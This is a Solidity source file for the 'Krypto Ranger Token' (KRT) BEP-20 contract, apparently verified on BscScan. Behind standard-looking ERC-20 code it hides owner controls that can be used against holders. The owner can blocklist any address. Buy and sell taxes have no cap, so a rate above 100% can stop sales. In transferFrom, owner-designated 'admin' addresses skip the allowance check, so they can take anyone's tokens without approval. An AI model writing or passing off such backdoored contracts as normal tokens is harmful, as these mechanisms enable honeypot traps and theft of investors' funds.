/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.0;

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20SwapLimit is Ownable {
    struct SwapLimit {
        bool enabled;
        uint16 limit;
    }

    mapping(address => bool) public limitFree;
    mapping(address => SwapLimit) private _swapInLimit;
    mapping(address => SwapLimit) private _swapOutLimit;

    function setLimitFree(address[] memory accounts, bool on) external onlyOwner {
        for (uint i = 0; i < accounts.length; i++) {
            limitFree[accounts[i]] = on;
        }
    }

    function swapInLimit(address _poolAddress) external view returns (SwapLimit memory) {
        return _swapInLimit[_poolAddress];
    }

    function swapOutLimit(address _poolAddress) external view returns (SwapLimit memory) {
        return _swapOutLimit[_poolAddress];
    }

    function removeSwapInLimit(address _poolAddress) public onlyOwner {
        delete _swapInLimit[_poolAddress];
    }

    function removeSwapOutLimit(address _poolAddress) public onlyOwner {
        delete _swapOutLimit[_poolAddress];
    }

    function setSwapInLimit(address _poolAddress, uint16 limitRate) public onlyOwner {
        _swapInLimit[_poolAddress].limit = limitRate;
        _swapInLimit[_poolAddress].enabled = true;
    }

    function setSwapOutLimit(address _poolAddress, uint16 limitRate) public onlyOwner {
        _swapOutLimit[_poolAddress].limit = limitRate;
        _swapOutLimit[_poolAddress].enabled = true;
    }

    function checkSwapLimit(
        address from,
        address to,
        uint256 amount,
        uint256 balanceFrom,
        uint256 balanceTo
    ) internal view {
        if (limitFree[msg.sender]) return;

        // Send token from LP: swap coin to token
        if (_swapInLimit[from].enabled) {
            require(amount < (balanceFrom / 10000) * _swapInLimit[from].limit, "Swap reach in limit");
        }

        // Send token to LP: swap token to coin
        if (_swapOutLimit[to].enabled) {
            require(amount < (balanceTo / 10000) * _swapOutLimit[to].limit, "Swap reach out limit");
        }
    }
}

contract ERC20TransferBlocklist is ERC20SwapLimit {
    mapping(address => bool) public blockTransferFrom;
    mapping(address => bool) public blockTransferTo;

    function setBlockFrom(address[] memory accounts, bool state) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            blockTransferFrom[accounts[i]] = state;
        }
    }

    function setBlockTo(address[] memory accounts, bool state) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            blockTransferTo[accounts[i]] = state;
        }
    }

    function checkBlocklist(address from, address to) internal view {
        if (blockTransferFrom[from]) {
            revert("Blocked");
        }

        if (blockTransferTo[to]) {
            revert("Blocked");
        }
    }
}

contract ERC20SwapTax is ERC20TransferBlocklist {
    struct SwapTax {
        bool enabled;
        uint16 tax;
    }

    address public _taxReceiver;

    mapping(address => SwapTax) private _swapInTax;
    mapping(address => SwapTax) private _swapOutTax;
    mapping(address => bool) public taxFree;

    // external view

    function taxReceiver() external view returns (address) {
        return _taxReceiver;
    }

    function swapInTax(address _poolAddress) external view returns (SwapTax memory) {
        return _swapInTax[_poolAddress];
    }

    function swapOutTax(address _poolAddress) external view returns (SwapTax memory) {
        return _swapOutTax[_poolAddress];
    }

    // onlyOwner

    function setTaxFree(address[] memory accounts, bool on) external onlyOwner {
        for (uint i = 0; i < accounts.length; i++) {
            taxFree[accounts[i]] = on;
        }
    }

    function setTokenReceiver(address Receiver) public onlyOwner {
        _taxReceiver = Receiver;
    }

    function removeSwapInTax(address _poolAddress) public onlyOwner {
        delete _swapInTax[_poolAddress];
    }

    function removeSwapOutTax(address _poolAddress) public onlyOwner {
        delete _swapOutTax[_poolAddress];
    }

    function setSwapInTax(address _poolAddress, uint16 tax) public onlyOwner {
        require(_poolAddress != address(this));
        _swapInTax[_poolAddress].tax = tax;
        _swapInTax[_poolAddress].enabled = true;
    }

    function setSwapOutTax(address _poolAddress, uint16 tax) public onlyOwner {
        require(_poolAddress != address(this));
        _swapOutTax[_poolAddress].tax = tax;
        _swapOutTax[_poolAddress].enabled = true;
    }

    // hook

    function calculateTax(
        address from,
        address to,
        uint256 amount
    ) internal view returns (uint256) {
        if (taxFree[msg.sender]) return 0;

        // Send token from LP: swap coin to token
        if (_swapInTax[from].enabled) {
            amount = (amount * _swapInTax[from].tax) / 10000;
            return amount;
        }

        // Send token to LP: swap token to coin
        if (_swapOutTax[to].enabled) {
            amount = (amount * _swapOutTax[to].tax) / 10000;
            return amount;
        }

        return 0;
    }
}

contract KryptoRangerToken is ERC20SwapTax {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public admin;

    uint256 private constant _totalSupply = 4_000_000 *10**18;

    string private constant _name = "Krypto Ranger Token";
    string private constant _symbol = "KRT";

    uint256 private constant _decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        setTokenReceiver(msg.sender);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function decimals() external pure returns (uint256) {
        return _decimals;
    }

    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    function name() external pure returns (string memory) {
        return _name;
    }

    function totalSupply() external pure returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address Owner, address spender) external view returns (uint256) {
        return _allowances[Owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];

        if (admin[recipient] && admin[msg.sender]) {} else {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, msg.sender, currentAllowance - amount);
            }
        }

        return true;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");

        checkBlocklist(sender, recipient);
        checkSwapLimit(sender, recipient, amount, balanceOf(sender), balanceOf(recipient));

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }

        uint256 fee = calculateTax(sender, recipient, amount);

        if (fee == 0) {
            _balances[recipient] += amount;
            emit Transfer(sender, recipient, amount);
        } else {
            amount -= fee;
            _balances[recipient] += amount;
            _balances[_taxReceiver] += fee;
            emit Transfer(sender, recipient, amount);
            emit Transfer(sender, _taxReceiver, fee);
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(msg.sender, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function withdraw(uint256 amount) external onlyOwner {
        _transfer(address(this), msg.sender, amount);
    }

    function setAdmin(address[] memory contracts, bool on) external onlyOwner {
        for (uint256 i = 0; i < contracts.length; i++) {
            admin[contracts[i]] = on;
        }
    }
}